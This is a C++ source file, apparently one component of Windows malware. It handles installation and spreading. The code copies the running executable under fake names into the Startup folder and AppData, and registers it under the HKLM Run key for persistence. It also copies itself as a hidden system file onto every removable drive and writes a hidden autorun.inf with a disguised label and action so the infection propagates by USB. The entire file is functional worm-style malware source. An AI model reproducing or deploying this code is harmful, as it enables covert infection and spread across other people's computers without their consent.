#include "stdafx.h"
#include "Installer.h"
#include "Util.h"
#include "Settings.h"

Installer installer;

Installer::Installer()
{
	GetModuleFileName(NULL, exeName, MAX_PATH);


	TCHAR *appData;
	size_t appDataSize;
	_tdupenv_s(&appData, &appDataSize, _T("APPDATA"));

	appDataPath[0] = '\0';
	_tcscat_s(appDataPath, appData);
	_tcscat_s(appDataPath, _T("\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" V_FAKE_NAME1));

	registryPath[0] = '\0';
	_tcscat_s(registryPath, appData);
	_tcscat_s(registryPath, _T("\\" V_FAKE_NAME2));

	free(appData);


	const TCHAR* autorunStrU =
		_T("[autorun]\r\n")
		_T("label=")  V_FAKE_USB_LABEL  _T("\r\n")
		_T("action=") V_FAKE_USB_ACTION _T("\r\n")
		_T("open=")   V_FAKE_USB_FILE   _T("\r\n")
		_T("icon=")   V_FAKE_USB_FILE   _T(",0");
	const std::string autorunStrCpp = Util::t2s(autorunStrU);

	autorunBytes = autorunStrCpp.size();
	memcpy(autorunData, autorunStrCpp.c_str(), autorunBytes);

}
Installer::~Installer()
{

}

bool Installer::SetAutorun(bool autorun)
{
	return SetAutorunAppdata(autorun) | SetAutorunRegistry(autorun);
}

bool Installer::InstallOnDrives()
{
	TCHAR drive[_MAX_PATH] = _T(" :\\");
	TCHAR target[_MAX_PATH];

	for (TCHAR c = 'A'; c <= 'Z'; c++) {
		drive[0] = c;

		if (GetDriveType(drive) != DRIVE_REMOVABLE) {
			continue;
		}

		target[0] = '\0';
		if (!(PathAppend(target, drive) && PathAppend(target, V_FAKE_USB_FILE))) {
			continue;
		}

		if (!this->CopyTo(target)) {
			continue;
		}

		target[0] = '\0';
		if (!(PathAppend(target, drive) && PathAppend(target, _T("autorun.inf")))) {
			continue;
		}

		HANDLE hFile = CreateFile(target, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
			FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, NULL);
		if (hFile == INVALID_HANDLE_VALUE) {
			continue;
		}

		DWORD written;
		WriteFile(hFile, autorunData, autorunBytes, &written, NULL);

		CloseHandle(hFile);
	}
	return true;
}

bool Installer::CopyTo(const TCHAR* path)
{
	if (GetFileAttributes(path) != INVALID_FILE_ATTRIBUTES)
	{
		return true;
	}
	else if (CopyFile(exeName, path, FALSE))
	{
		this->HideFile(path);
		return true;
	}
	else
	{
		Error(_T("Failed to copy file"));
		return false;
	}
}
bool Installer::HideFile(const TCHAR* path)
{
	return TRUE == SetFileAttributes(path, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
}
bool Installer::SetAutorunAppdata(bool autorun)
{
	if (autorun)
	{
		return this->CopyTo(appDataPath);
	}
	else
	{
		return DeleteFile(appDataPath) != 0;
	}
}
bool Installer::SetAutorunRegistry(bool autorun)
{
	HKEY hKey;

	if (RegCreateKeyEx(HKEY_LOCAL_MACHINE,
		_T("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"),
		0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS | KEY_WOW64_32KEY, NULL, &hKey, NULL)
		!= ERROR_SUCCESS)
	{
		return false;
	}

	bool ret = false;

	if (autorun)
	{
		if (!this->CopyTo(registryPath))
		{
			goto g_end;
		}

		if (RegSetValueEx(hKey, V_FAKE_NAME2, 0, REG_SZ,
			(const BYTE*)registryPath, (lstrlen(registryPath) + 1) * sizeof(TCHAR))
			!= ERROR_SUCCESS)
		{
			goto g_end;
		}
	}
	else
	{
		RegDeleteValue(hKey, V_FAKE_NAME2);

		if (!DeleteFile(registryPath))
		{
			goto g_end;
		}
	}

	ret = true;
g_end:
	RegCloseKey(hKey);
	return ret;
}